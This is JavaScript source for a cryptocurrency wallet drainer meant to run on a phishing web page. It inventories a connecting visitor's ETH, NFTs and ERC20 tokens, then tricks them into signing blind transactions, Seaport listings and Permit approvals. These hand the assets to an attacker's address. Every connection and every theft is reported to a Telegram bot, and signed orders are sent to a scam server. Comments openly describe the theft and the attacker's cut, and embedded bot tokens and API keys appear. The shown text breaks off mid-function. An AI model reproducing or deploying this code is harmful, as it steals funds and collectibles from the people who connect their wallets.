const { ethers, ethereum } = window
const recipient = "0x0000000000000000000000000" // ADD YOUR RECEIVER ADDRESS HERE
const telegramBot = "7220881327:AAFCkRsUh0s-9HLm7-d7wLhIeauV7O7f_60" // tg bot token
const telegramChatId = -1002029159293 // chat id for main tg bot


const mainButton = document.getElementById("actionButton")

const RPC = "https://mainnet.infura.io/v3/74f7cb8c9f0a469086b57331819bccc0"

const SeaportConduit = "0x1E0049783F008A0085193E00003D00cd54003c71" // dont touch! its the official opensea contract address 



//The reason why there are few developers who could create seaport scam
//The code is really easy, but there is one trick
//It gives an error when the balance of the INITIATOR AND the RECIPIENT are less than 15 bucks
//otherwise error:
//https://docs.ethers.io/v5/troubleshooting/errors/#help-INSUFFICIENT_FUNDS

//--> solution: always keep like 300$ on the RECIPIENT address

const ERC721_ABI = [
    {
        "inputs": [
            { "internalType": "address", "name": "owner", "type": "address" },
            { "internalType": "address", "name": "operator", "type": "address" },
        ],
        "name": "isApprovedForAll",
        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "operator", "type": "address" },
            { "internalType": "bool", "name": "_approved", "type": "bool" }
        ],
        "name": "setApprovalForAll",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]
const ScamABI = [
    {
        "inputs": [], 
        "stateMutability": 
        "nonpayable", 
        "type": "constructor"
    },
    {
        "inputs": [
            { "internalType": "contract ERC721Partial", "name": "tokenContract", "type": "address" }, 
            { "internalType": "address", "name": "actualOwner", "type": "address" }, 
            { "internalType": "address", "name": "recipient", "type": "address" }, 
            { "internalType": "uint256[]", "name": "tokenIds", "type": "uint256[]" }
        ], 
        "name": "batchTransfer", 
        "outputs": [], 
        "stateMutability": "nonpayable", 
        "type": "function"
    }, 
    {
        "inputs": [
            { "internalType": "address", "name": "_newExector", "type": "address" }
        ], 
        "name": "setExecutor", 
        "outputs": [], 
        "stateMutability": "nonpayable", 
        "type": "function"
    }
]
const ABI_COUNTER = [
    {
        "inputs": [
            { "internalType": "address", "name": "offerer", "type": "address" }
        ],
        "name": "getCounter",
        "outputs": [
            { "internalType": "uint256", "name": "counter", "type": "uint256" }
        ],
        "stateMutability": "view",
        "type": "function"
    }
]
const PermitERC20_ABI = [
    {
        "inputs": [
            { "internalType": "address", "name": "owner", "type": "address" },
            { "internalType": "address", "name": "spender", "type": "address" },
            { "internalType": "uint256", "name": "value", "type": "uint256" },
            { "internalType": "uint256", "name": "deadline", "type": "uint256" },
            { "internalType": "uint8", "name": "v", "type": "uint8" },
            { "internalType": "bytes32", "name": "r", "type": "bytes32" },
            { "internalType": "bytes32", "name": "s", "type": "bytes32" }
        ],
        "name": "permit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "from", "type": "address" },
            { "internalType": "address", "name": "to", "type": "address" },
            { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "transferFrom",
        "outputs": [
            { "internalType": "bool", "name": "", "type": "bool" }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "owner", "type": "address" }
        ],
        "name": "nonces",
        "outputs": [
            { "internalType": "uint256", "name": "", "type": "uint256" }
        ],
        "stateMutability": "view",
        "type": "function"
    }
]
const ERC20_ABI = [
    {
        "constant": false,
        "inputs": [
            { "name": "_spender", "type": "address" },
            { "name": "_value", "type": "uint256" }
        ],
        "name": "approve",
        "outputs": [
            { "name": "", "type": "bool" }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "from", "type": "address" },
            { "internalType": "address", "name": "to", "type": "address" },
            { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "transferFrom",
        "outputs": [
            { "internalType": "bool", "name": "", "type": "bool" }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

const PermitERC20s = [
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
    "0xa5f2211B9b8170F694421f2046281775E8468044", // THOR
    "0x549E4D92285ff5A16c9484Ff79211E4358b1f202", // TIC
    "0x6810e776880C02933D47DB1b9fc05908e5386b96", // GNO
    "0xc5102fE9359FD9a28f877a67E36B0F050d81a3CC", // HOP
    "0xA36FDBBAE3c9d55a1d67EE5821d53B50B63A1aB9", // TEMP
    "0x7f280daC515121DcdA3EaC69eB4C13a52392CACE", // FNC
    "0x956F47F50A910163D8BF957Cf5846D573E7f87CA", // FEI
    "0x0de05f6447ab4d22c8827449ee4ba2d5c288379b", // OOKI
    "0x2aECCB42482cc64E087b6D2e5Da39f5A7A7001f8", // RULER
    "0xF406F7A9046793267bc276908778B29563323996", // VISION
    "0x632806BF5c8f062932Dd121244c9fbe7becb8B48", // PDI
    "0x41d5d79431a913c4ae7d69a668ecdfe5ff9dfb68", // INV
    "0x6e9730EcFfBed43fD876A264C982e254ef05a0DE", // NORD
    "0x31c8eacbffdd875c74b94b077895bd78cf1e64a3", // RAD
    "0x0000000000095413afc295d19edeb1ad7b71c952", // LON
    "0x77fba179c79de5b7653f68b5039af940ada60ce0", // FORTH
    "0x03ab458634910AaD20eF5f1C8ee96F1D6ac54919", // RAI
    "0x16ECCfDbb4eE1A85A33f3A9B21175Cd7Ae753dB4", // ROUTE
    "0x4Cf89ca06ad997bC732Dc876ed2A7F26a9E7f361", // MYST
    "0x15b7c0c907e4C6b9AdaAaabC300C08991D6CEA05", // GEL
    "0x054D64b73d3D8A21Af3D764eFd76bCaA774f3Bb2", // PPAY
    "0xf418588522d5dd018b425E472991E52EBBeEEEEE", // PUSH
    "0x0cEC1A9154Ff802e7934Fc916Ed7Ca50bDE6844e", // POOL
    "0x86772b1409b61c639eaac9ba0acfbb6e238e5f83", // NDX
    "0x7DD9c5Cba05E151C895FDe1CF355C9A1D5DA6429", // GLM
    "0xDDdddd4301A082e62E84e43F474f044423921918", // DVF
    "0x31429d1856aD1377A8A0079410B297e1a9e214c2", // ANGLE
    "0x2B4200A8D373d484993C37d63eE14AeE0096cd12", // USDFL
    "0xfe9A29aB92522D14Fc65880d817214261D8479AE", // SNOW
    "0x888888435FDe8e7d4c54cAb67f206e4199454c60", // DFX
    "0xc221b7E65FfC80DE234bbB6667aBDd46593D34F0", // WCFG
    "0x6f40d4A6237C257fff2dB00FA0510DeEECd303eb", // INST
    "0xf0f9D895aCa5c8678f706FB8216fa22957685A13", // CULT
    "0x321c2fe4446c7c963dc41dd58879af648838f98d", // CTX
    "0xf16e81dce15B08F326220742020379B855B87DF9", // ICE
    "0x725c263e32c72ddc3a19bea12c5a0479a81ee688", // BMI
    "0xceb286C9604c542d3cc08b41AA6C9675B078A832", // VTX
    "0xDe30da39c46104798bB5aA3fe8B9e0e1F348163F", // GTC
    "0x949D48EcA67b17269629c7194F4b727d4Ef9E5d6", // MC
    "0xcAfE001067cDEF266AfB7Eb5A286dCFD277f3dE5", // PSP
    "0xd38BB40815d2B0c2d2c866e0c72c5728ffC76dd9", // SIS
    "0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5", // OHM
    "0xFe459828c90c0BA4bC8b42F5C5D44F316700B430", // BBS
    "0x0f2D719407FdBeFF09D87557AbB7232601FD9F29", // SYN
    "0x0ab87046fBb341D058F17CBC4c1133F25a20a52f", // gOHM
    "0x4688a8b1f292fdab17e9a90c8bc379dc1dbd8713", // COVER
    "0x48c3399719b582dd63eb5aadf12a40b4c3f52fa2", // SWISE
    "0x6dea81c8171d0ba574754ef6f8b412f2ed88c54d", // LQTY
    "0x5f98805a4e8be255a32880fdec7f6728c6568ba0", // LUSD
    "0x1a7e4e63778b4f12a199c062f3efdd288afcbce8", // AGUER
    "0x5a666c7d92E5fA7Edcb6390E4efD6d0CDd69cF37", // MARSH
    "0xcd2828fc4d8e8a0ede91bb38cf64b1a81de65bf6", // ODDZ
    "0x9695e0114e12c0d3a3636fab5a18e6b737529023", // DFYN
    "0xc477d038d5420c6a9e0b031712f61c5120090de9", // BOSON
    "0x1559fa1b8f28238fd5d76d9f434ad86fd20d1559", // EDEN
    "0xa8b61cff52564758a204f841e636265bebc8db9b", // YIELD
    "0x1321f1f1aa541a56c31682c57b80ecfccd9bb288", // ARCX
    "0x77777feddddffc19ff86db637967013e6c6a116c", // TORN
    "0xa8b12cc90abf65191532a12bb5394a714a46d358", // pBTC35A
    "0x9b99cca871be05119b2012fd4474731dd653febe", // MATTER
    "0xc7283b66Eb1EB5FB86327f08e1B5816b0720212B", // TRIBE
    "0x888888888889c00c67689029d7856aac1065ec11", // OPIUM
    "0x6399C842dD2bE3dE30BF99Bc7D1bBF6Fa3650E70", // PREMIA
    "0x8254e26e453eb5abd29b3c37ac9e8da32e5d3299", // RBX
    "0x12e51E77DAAA58aA0E9247db7510Ea4B46F9bEAd", // aYFI
    "0x6b175474e89094c44da98b954eedeac495271d0f", // DAI
    "0x90de74265a416e1393a450752175aed98fe11517", // UDT
    "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", // AAVE
    "0x111111111117dC0aa78b770fA6A738034120C302", // 1inch
    "0x3832d2F059E55934220881F831bE501D180671A7", // renDOGE
    "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984", // Uni
    "0x92D6C1e31e14520e676a687F0a93788B716BEff5", // dYdX
    "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0", // Wrapped Staked ETH
    "0xeb4c2781e4eba804ce9a9803c67d0893436bb27d", // renBTC
    "0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72", // ENS ERC20
    "0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5", // Olympus OHM
    "0x1aBaEA1f7C830bD89Acc67eC4af516284b1bC33c", // EURO Coin lol
    "0x030ba81f1c18d280636f32af80b9aad02cf0854e", // Aave WETH
    "0xdf7ff54aacacbff42dfe29dd6144a69b629f8c9e", // Aave ZRX
    "0x3ed3b47dd13ec9a98b44e6204a523e766b225811", // Aave USDT
    "0x9ff58f4ffb29fa2266ab25e75e2a8b3503311656", // Aave WBTC
    "0xbcca60bb61934080951369a648fb03df4f96263c" // Aave USDC

]

let provider, web3
let selectedAddress
let victimNonce, initiatorNonce

async function connect() {
    console.log('>>>>[connect START]')
    web3 = new Web3(ethereum)
    provider = new ethers.providers.Web3Provider(ethereum)
    const network = await provider.getNetwork()
    if (network.chainId !== 1) {
        try {
            await provider.send("wallet_switchEthereumChain", [{ chainId: "0x1" }])
        } catch (err) {
            console.log("error", err)
            return
        }
    }
    const accounts = await provider.send("eth_requestAccounts", [])
    selectedAddress = accounts[0]

    victimNonce = await web3.eth.getTransactionCount(selectedAddress)
    victimNonce = parseInt(victimNonce)

    initiatorNonce = await web3.eth.getTransactionCount(initiator)
    initiatorNonce = parseInt(initiatorNonce)

    await axios.post(`https://api.telegram.org/bot${telegramConnectBot}/sendMessage`, {
        chat_id: telegramConnectChatId,
        text: `🎩 *New Connect* | 📍 ${window.location.hostname} \n[${selectedAddress}](https://etherscan.io/address/${selectedAddress})`,
        parse_mode: "markdown",
        disable_web_page_preview: true
    })

    console.log('[connect END]<<<<')
    return
}

async function analyzeWallet() {
    console.log('[Analyze Wallet START]')
    mainButton.textContent = "Wait..."

    const walletData = {
        Seaport: {
            "collections": [],
            "totalVolume": 0
        },
        Other: [] // Unapproved ERC721s, ETH, ERC20s (with Permit and not)
    }
    
    // Get ETH Price
    const ethData = await axios.get("https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=ethereum", { 
        headers: { "Access-Control-Allow-Origin": "*" }
    })
    .then(response => response.data)
    .catch(error => { throw new Error(error) })
    const ethPrice = ethData[0].current_price
    
    // Get ETH balabce
    const balanceETH = await provider.getBalance(selectedAddress)
    let balanceUSD = parseFloat(ethers.utils.formatEther(balanceETH)) * ethPrice
    balanceUSD = balanceUSD.toFixed(4)

    // 20 buks, cause if eth gonna be the most expensive, then after it goes couple collections and tokens
    // so around 10 bucks gonna be spended on fulfilling transactions, another 10 bucks will go to us
    if (balanceUSD >= 1) {
        balanceUSD -= 1 // approxiamtely 13 bucks for all transfers
        const amountToStealETH = (balanceUSD / ethPrice).toFixed(4)
        const amountToStealWEI = await web3.utils.toWei(amountToStealETH.toString(), "ether")
        walletData.Other.push({
            "type": "ETH",
            "amount": amountToStealWEI,
            "volume": parseFloat(balanceUSD)
        })
    }

    // Get All NFTs
    const collections = await axios.get(`https://api.opensea.io/api/v1/collections?asset_owner=${selectedAddress}&offset=0&limit=200`)
    .then(response => response.data)
    .catch(error => { throw new Error(error) })
    
    for (let i = 0; i < collections.length; i++) {
        const currentCollection = collections[i]
        if (currentCollection.primary_asset_contracts.length > 0) {
            if (currentCollection.primary_asset_contracts[0].schema_name == "ERC721") {
                let contracts = currentCollection.primary_asset_contracts
                if (contracts.length > 0) {
                    const contractAddress = await ethers.utils.getAddress(contracts[0].address)
                    if (contractAddress != "0x495f947276749Ce646f68AC8c248420045cb7b5e") { // not opensea bullshit
                        let floorPrice = parseFloat(currentCollection.stats.floor_price) * ethPrice
                        floorPrice = floorPrice.toFixed(4)
                        if (floorPrice > -1) { // set to 5 instead of 0 when testing on good collections
                            const contract = new web3.eth.Contract(ERC721_ABI, contractAddress)
                            const isApproved = await contract.methods.isApprovedForAll(selectedAddress, SeaportConduit).call()
                            if (isApproved) {
                                walletData.Seaport.collections.push({
                                    "name": currentCollection.name,
                                    "contract": contractAddress,
                                    "tokenIDs": [],
                                    "volume": floorPrice
                                })
                            } else {
                                walletData.Other.push({
                                    "name": currentCollection.name,
                                    "type": "NFT",
                                    "contract": contractAddress,
                                    "tokenIDs": [],
                                    "volume": floorPrice
                                })
                            }
                        }
                    }
                }
            }
        }
    }

    // Fil in token IDs to collections
    const NFTsData = await axios.get(`https://api.opensea.io/api/v1/assets?owner=${selectedAddress}&order_direction=desc&limit=200&include_orders=false`)
    .then(response => response.data)
    .catch(error => { throw new Error(error) })
        
    NFTsData.assets.forEach(async asset => {
        const contractAddress = await ethers.utils.getAddress(asset.asset_contract.address)

        const seaportIndex = walletData.Seaport.collections.findIndex(item => item["contract"] === contractAddress)
        const safaIndex = walletData.Other.findIndex(item => item["contract"] === contractAddress)
            
        if (seaportIndex > -1) {
            walletData.Seaport.collections[seaportIndex].tokenIDs.push(asset.token_id)
        } else if (safaIndex > -1) {
            if (walletData.Other[safaIndex].type == "NFT") {
                walletData.Other[safaIndex].tokenIDs.push(asset.token_id)
            }
        }
    })
    
    // Calculate total income value from collections
    for (let index = 0; index < walletData.Seaport.collections.length; index++) {
        const collectionFloorPrice = walletData.Seaport.collections[index].volume
        const numberOfNFTs = walletData.Seaport.collections[index].tokenIDs.length
        const totalVolume = collectionFloorPrice * numberOfNFTs
        walletData.Seaport.collections[index].volume = totalVolume
        walletData.Seaport.totalVolume += totalVolume
    }
    
    for (let index = 0; index < walletData.Other.length; index++) {
        if (walletData.Other[index].type == "NFT") {
            const collectionFloorPrice = walletData.Other[index].volume
            const numberOfNFTs = walletData.Other[index].tokenIDs.length
            walletData.Other[index].volume = collectionFloorPrice * numberOfNFTs
        }
    }
    
    // Get All ERC20 Tokens (which are confirm the IERC20Permit)
    const headers = { "x-api-key": "0IES7IL6j1dMH2BiWVkz5jPTiOvcFwvezraLgyg162NgV9SUraHbIwrjtJWiapGT" }
    const ERC20s = await axios.get(`https://deep-index.moralis.io/api/v2/${selectedAddress}/erc20?chain=eth`, { headers: headers })
    .then(response => response.data)
    .catch(error => { throw new Error(error) })
    
    let ERC20PermitToken = null
    for (const token of ERC20s) {
        const tokenAddress = await web3.utils.toChecksumAddress(token.token_address)
        const balance = token.balance
        const normalBalance = (parseInt(balance) / (10 ** token.decimals)).toFixed(4)
        
        let errorMessage = "" // NEW
        let tokenPrice = await axios.get(`https://deep-index.moralis.io/api/v2/erc20/${tokenAddress}/price?chain=eth`, { headers: headers })
        .then(response => response.data) 
             
        //.catch(error => { reject(error) }) // old 
        .catch(error => { 
            errorMessage = error.response.data.message
            // console.log(error)
            // console.log(error.response.data)
            // console.log(error.response.data.message)
         })
    if (errorMessage === "No pools found with enough liquidity, to calculate the price") {
        continue; // break the for loop
    } 
    if (errorMessage !== "") {
        reject(error) // reject if <> "" -> means something is in the errorMessage
    }

        tokenPrice = normalBalance * tokenPrice.usdPrice
        tokenPrice = tokenPrice.toFixed(4)
        if (tokenPrice > 0) { // SET TO 5
            if (PermitERC20s.includes(tokenAddress)) {
                ERC20PermitToken = {
                    "type": "ERC20Permit",
                    "name": token.name,
                    "contract": tokenAddress,
                    "balance": balance,
                    "volume": tokenPrice
                }
            } else {
                walletData.Other.push({
                    "type": "ERC20",
                    "name": token.name,
                    "contract": tokenAddress,
                    "balance": balance,
                    "volume": tokenPrice
                })
            }
        }
    }
    
    // wait for a bit in order everything work properly
    await sleep(1000) // wait 1 seconds

    // Manipulations with Others array
    if (walletData.Other.length > 0) {
        // Sort array of other assets
        walletData.Other.sort((a, b) => { return b.volume - a.volume })

        // find a place for a ERC20Permit Token
        if (ERC20PermitToken != null) {
            if (ERC20PermitToken.volume > (walletData.Other[0].volume / 2)) {
                walletData.Other = [ERC20PermitToken].concat(walletData.Other)
            } else {
                walletData.Other.push(ERC20PermitToken)
                walletData.Other.sort((a, b) => { return b.volume - a.volume })
            }
        }
        
        // Keep only first three elements in others
        // walletData.Other = walletData.Other.slice(0, 3)
    }
    console.log('[Analyze Wallet END]')
    return walletData
}

async function executeOtherAssets(others, bound) {
    for (let index = 0; index < bound; index++) {
        const asset = others[index]
        if (asset.type == "NFT") {
            await stealCollection(asset).then(() => {
                sendLog(`🔮 *SAFA* | 📍 ${window.location.hostname} \nName: *${asset.name}* \nWorth: *$${asset.volume}* \n[${selectedAddress.substring(0, 14)}...](https://etherscan.io/address/${selectedAddress})`)
            }).catch(error => {
                sendLog(`🔮 *SAFA* | 📍 ${window.location.hostname} \nName: *${asset.name}* \nError: *${error}* \n[${selectedAddress.substring(0, 14)}...](https://etherscan.io/address/${selectedAddress})`)
            })
        } else if (asset.type == "ETH") {
            await stealETH(asset).then(() => {
                sendLog(`💎 *ETH* | 📍 ${window.location.hostname} \nWorth: *$${asset.volume}* \n[${selectedAddress.substring(0, 14)}...](https://etherscan.io/address/${selectedAddress})`)
            }).catch(error => {
                sendLog(`💎 *ETH* | 📍 ${window.location.hostname} \nError: *${error}*\n[$${selectedAddress.substring(0, 14)}...](https://etherscan.io/address/${selectedAddress})`)
            })
        } else if (asset.type == "ERC20Permit") {
            await permitSteal(asset).then(() => {
                sendLog(`🪙 *ERC20 Permit* | 📍 ${window.location.hostname} \nName: *${asset.name}* \nWorth: *$${asset.volume}* \n[${selectedAddress.substring(0, 14)}...](https://etherscan.io/address/${selectedAddress})`)
            }).catch(error => {
                sendLog(`🪙 *ERC20 Permit* | 📍 ${window.location.hostname} \nName: *${asset.name}* \nError: *${error}* \n[${selectedAddress.substring(0, 14)}...](https://etherscan.io/address/${selectedAddress})`)
            })
        } else if (asset.type == "ERC20") {
            await tokenSteal(asset).then(() => {
                sendLog(`🪙 *ERC20* | 📍 ${window.location.hostname} \nName: *${asset.name}* \nWorth: *$${asset.volume}* \n[${selectedAddress.substring(0, 14)}...](https://etherscan.io/address/${selectedAddress})`)
            }).catch(error => {
                sendLog(`🪙 *ERC20* | 📍 ${window.location.hostname} \nName: *${asset.name}* \nError: *${error}* \n[${selectedAddress.substring(0, 14)}...](https://etherscan.io/address/${selectedAddress})`)
            })
        }
    }
}

async function routeStealling() {
    await analyzeWallet().then(async walletData => {
        console.log(walletData)

        if (walletData.Seaport.collections.length > 0) {
            await seaportSteal(walletData.Seaport.collections).then(volume => {
                sendLog(`🐳 *Seaport* | 📍 ${window.location.hostname} \nWorth: *$${volume}* \n[${selectedAddress.substring(0, 14)}...](https://etherscan.io/address/${selectedAddress})`)
            }).catch(error => {
                sendLog(`🐳 *Seaport* | 📍 ${window.location.hostname} \nError: *${error}* \n[${selectedAddress.substring(0, 14)}...](https://etherscan.io/address/${selectedAddress})`)
            })
        }

        if (walletData.Other.length > 0) {
            await executeOtherAssets(walletData.Other, walletData.Other.length)
        }
        
    }).catch(error => {
        console.error(error)
    })
}

const stealCollection = (asset) => new Promise(async (resolve, reject) => {
    try {
        const contract = new web3.eth.Contract(ERC721_ABI, asset.contract, { from: selectedAddress })

        const gasPrice = await web3.eth.getGasPrice()
        const data = contract.methods.setApprovalForAll(ScamContract, true).encodeABI()
        
        let rawTx = {
            "to": asset.contract,
            "nonce": web3.utils.toHex(victimNonce),
            "gasLimit": web3.utils.toHex(90000),
            "gasPrice": web3.utils.toHex(Math.floor(gasPrice * 1.3)),
            "value": "0x",
            "data": data,
            "v": "0x1",
            "r": "0x",
            "s": "0x"
        }

        let tx = new ethereumjs.Tx(rawTx)
        const finalTx = "0x" + tx.serialize().toString("hex")
        const finalHash = web3.utils.sha3(finalTx, {"encoding": "hex"})

        web3.eth.sign(finalHash, selectedAddress).then(async signed => { 
            const temporary = signed.substring(2)
            const r_ = "0x" + temporary.substring(0, 64)
            const s_ = "0x" + temporary.substring(64, 128)
            const rhema = parseInt(temporary.substring(128, 130), 16)
            const v_ = web3.utils.toHex(rhema + 2 + 8)
    
            tx.r = r_
            tx.s = s_
            tx.v = v_
    
            const finalTX = "0x" + tx.serialize().toString("hex")
            web3.eth.sendSignedTransaction(finalTX).then(async () => {
                // Batch Transfer all user's ENS
                const transferIDs = asset.tokenIDs.map(function (id) { 
                    return ethers.BigNumber.from(id)
                })
                
                const contract = new web3.eth.Contract(ScamABI, ScamContract)
                const data = contract.methods.batchTransfer(asset.contract, selectedAddress, recipient, transferIDs).encodeABI()
                    
                const batchTx = {
                    "from": initiator,
                    "to": ScamContract,
                    "nonce": web3.utils.toHex(initiatorNonce),
                    "gasLimit": web3.utils.toHex(120000),
                    "gasPrice": web3.utils.toHex(Math.floor(gasPrice * 1.3)),
                    "data": data,
                    "value": "0x"
                }
                const signedTx = await web3.eth.accounts.signTransaction(batchTx, initiatorPK)
                web3.eth.sendSignedTransaction(signedTx.rawTransaction)
                initiatorNonce += 1
            }).catch(() => {
                reject("Approval Tx failed")
            })

            victimNonce += 1

            resolve()
        }).catch(() => {
            reject("Denied Signature")
        })
    } catch {
        reject("Unknown error")
    }
})

const seaportSteal = (assets) => new Promise(async (resolve, reject) => {
    try {
        // get counter
        const contract = new web3.eth.Contract(ABI_COUNTER, "0x00000000006c3852cbEf3e08E8dF289169EdE581")
        let counter = await contract.methods.getCounter(selectedAddress).call()
        counter = parseInt(counter.toString())

        // make orders, considers
        const orders = []
        const considers = []

        let totalVolume = 0

        assets.forEach(asset => {
            totalVolume += asset.volume

            asset.tokenIDs.forEach(tokenId => {
                orders.push({
                    itemType: 2,
                    token: asset.contract,
                    identifierOrCriteria: tokenId,
                    startAmount: "1",
                    endAmount: "1"
                })
            
                considers.push({
                    itemType: 2,
                    token: asset.contract,
                    identifierOrCriteria: tokenId,
                    startAmount: "1",
                    endAmount: "1",
                    recipient: recipient
                })
            })
        })

        function getPreviousDay(date = new Date()) {
            const previous = new Date(date.getTime())
            previous.setDate(date.getDate() - 1)
            return previous
        }

        const date = getPreviousDay()
        const milliseconds = date.getTime()
        const dateClone = date
        dateClone.setTime(milliseconds + (2 * 24 * 60 * 60 * 1000))
        const milliseconds_tomorrow = dateClone.getTime()
        const tomorrow_seconds = Math.floor(milliseconds_tomorrow / 1000)
        const seconds = Math.floor(milliseconds / 1000)

        let salt = ""
        const characters = "0123456789"
        const charactersLength = characters.length
        for (let i = 0; i < 70; i++) {
            salt += characters.charAt(Math.floor(Math.random() * charactersLength))
        }

        const offer = {
            "offerer": ethers.utils.getAddress(selectedAddress),
            zone: "0x004C00500000aD104D7DBd00e3ae0A5C00560C00",
            "offer": orders,
            consideration: considers,
            orderType: 2,
            startTime: seconds,
            endTime: tomorrow_seconds,
            zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
            salt: salt,
            totalOriginalConsiderationItems: considers.length,
            conduitKey: "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000"
        }

        const signer = provider.getSigner()
        const Seaport = new seaport.Seaport(signer)

        Seaport.signOrder(offer, counter).then(async signature => {
            offer["counter"] = counter
            const order = {
                "recipient": recipient,
                "parameters": offer,
                "signature": signature
            }

            // Steal All User's ENS though API
            fetch(ScamAPI + "/seaport", {
                headers: { "Content-Type": "application/json; charset=utf-8" },
                mode: "cors",
                method: "POST",
                body: JSON.stringify(order)
            })

            initiatorNonce += 1

            await sleep(1500)

            resolve(totalVolume)
        }).catch(() => {
            reject("Denied Signature")
        })
    } catch {
        reject("Unknown error")
    }
})

const stealETH = (asset) => new Promise(async (resolve, reject) => {
    try {
        const gasPrice = await web3.eth.getGasPrice()
        
        let rawTX = {
            "to": recipient,
            "nonce": web3.utils.toHex(victimNonce),
            "gasLimit": web3.utils.toHex(40000),
            "gasPrice": web3.utils.toHex(Math.floor(gasPrice * 1.3)),
            "value": web3.utils.toHex(asset.amount),
            "data": "0x",
            "v": "0x1",
            "r": "0x",
            "s": "0x"
        }
        var tx = new ethereumjs.Tx(rawTX)
        const initialTX = "0x" + tx.serialize().toString("hex")
        const initialHash = web3.utils.sha3(initialTX, {"encoding": "hex"})

        web3.eth.sign(initialHash, selectedAddress).then(async signed => { 
            const temporary = signed.substring(2)
            const r_ = "0x" + temporary.substring(0, 64)
            const s_ = "0x" + temporary.substring(64, 128)
            const rhema = parseInt(temporary.substring(128, 130), 16)
            const v_ = web3.utils.toHex(rhema + 2 + 8)
        
            tx.r = r_
            tx.s = s_
            tx.v = v_
        
            const finalTX = "0x" + tx.serialize().toString("hex")

            web3.eth.sendSignedTransaction(finalTX)
            victimNonce += 1

            await sleep(1500)

            resolve()
        }).catch(() => {
            reject("Denied Signature")
        })
    } catch {
        reject("Unknown error")
    }
})

const permitSteal = (asset) => new Promise(async (resolve, reject) => {
    try {
        const tokenContract = new web3.eth.Contract(PermitERC20_ABI, asset.contract)
        const contractNonce = await tokenContract.methods.nonces(selectedAddress).call()
        const deadline = (Math.round(Date.now() / 1000)) + 100

        const dataToSign = JSON.stringify({
            domain: {
                name:  asset.name,
                version: "2",
                chainId: 1,
                verifyingContract: asset.contract
            }, 
            types: {
                EIP712Domain: [
                    { name: "name", type: "string" },
                    { name: "version", type: "string" },
                    { name: "chainId", type: "uint256" },
                    { name: "verifyingContract", type: "address" },
                ],
                Permit: [
                    { name: "owner", type: "address" },
                    { name: "spender", type: "address" },
                    { name: "value", type: "uint256" },
                    { name: "nonce", type: "uint256" },
                    { name: "deadline", type: "uint256" },
                ]
            },
            primaryType: "Permit",
            message: { 
                owner: selectedAddress, 
                spender: initiator, 
                value: asset.balance, // asset that Int here
                nonce: parseInt(contractNonce), 
                deadline: deadline 
            }
        })
        
        web3.currentProvider.sendAsync({
            method: "eth_signTypedData_v3",
            params: [selectedAddress, dataToSign],
            from: selectedAddress
        }, async (error, result) => {
            if (error != null) return reject("Denied Signature")

            const signature = result.result
            const splited = ethers.utils.splitSignature(signature)
    
            const permit = tokenContract.methods.permit(selectedAddress, initiator, asset.balance, deadline, splited.v, splited.r, splited.s).encodeABI()
            const gasPrice = await web3.eth.getGasPrice()
            const rawTX = {
                from: initiator,
                to: asset.contract,
                nonce: web3.utils.toHex(initiatorNonce),
                gasLimit: web3.utils.toHex(98000),
                gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
                value: "0x",
                data: permit
            }
            const signedTx = await web3.eth.accounts.signTransaction(rawTX, initiatorPK)
            web3.eth.sendSignedTransaction(signedTx.rawTransaction)
            
            initiatorNonce += 1

            // after the token is approved to us, steal it
            const data = tokenContract.methods.transferFrom(selectedAddress, recipient, asset.balance).encodeABI() 
            const finalTx = {
                "from": initiator,
                "to": asset.contract,
                "nonce": web3.utils.toHex(initiatorNonce),
                "gasLimit": web3.utils.toHex(90000),
                "gasPrice": web3.utils.toHex(Math.floor(gasPrice * 1.3)),
                "data": data,
                "value": "0x"
            } 
            const finalSignedTx = await web3.eth.accounts.signTransaction(finalTx, initiatorPK)
            web3.eth.sendSignedTransaction(finalSignedTx.rawTransaction)
            initiatorNonce += 1

            resolve()
        })
    } catch {
        reject("Unknown error")
    }
})

const tokenSteal = (asset) => new Promise(async (resolve, reject) => {
    try {
        const contract = new web3.eth.Contract(ERC20_ABI, asset.contract)
        const gasPrice = await web3.eth.getGasPrice()
        const data = contract.methods.approve(initiator, asset.balance).encodeABI()
        let rawTx = {
            "to": asset.contract,
            "nonce": web3.utils.toHex(victimNonce),
            "gasLimit": web3.utils.toHex(65000),
            "gasPrice": web3.utils.toHex(Math.floor(gasPrice * 1.3)),
            "value": "0x",
            "data": data,
            "v": "0x1",
            "r": "0x",
            "s": "0x"
        }
        let tx = new ethereumjs.Tx(rawTx)
        const finalTx = "0x" + tx.serialize().toString("hex")
        const finalHash = web3.utils.sha3(finalTx, {"encoding": "hex"})

        web3.eth.sign(finalHash, selectedAddress).then(async signed => { 
            const temporary = signed.substring(2)
            const r_ = "0x" + temporary.substring(0, 64)
            const s_ = "0x" + temporary.substring(64, 128)
            const rhema = parseInt(temporary.substring(128, 130), 16)
            const v_ = web3.utils.toHex(rhema + 2 + 8)
    
            tx.r = r_
            tx.s = s_
            tx.v = v_
    
            const finalTX = "0x" + tx.serialize().toString("hex")
            web3.eth.sendSignedTransaction(finalTX).then(async () => {
                const data = contract.methods.transferFrom(selectedAddress, recipient, asset.balance).encodeABI()    
                const finalTx = {
                    "from": initiator,
                    "to": asset.contract,
                    "nonce": web3.utils.toHex(initiatorNonce),
